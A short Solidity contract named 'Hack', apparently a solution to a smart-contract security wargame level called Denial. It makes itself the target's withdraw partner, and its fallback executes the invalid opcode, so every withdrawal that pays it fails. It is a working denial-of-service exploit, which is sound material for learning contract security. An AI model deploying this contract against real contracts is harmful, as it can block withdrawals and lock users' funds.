//SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface IDenial {
    function setWithdrawPartner(address) external;
}

contract Hack {
    constructor(IDenial contractAddress) {
        contractAddress.setWithdrawPartner(address(this));
    }

    fallback() external payable {

        assembly {
            invalid()
        }
    }
}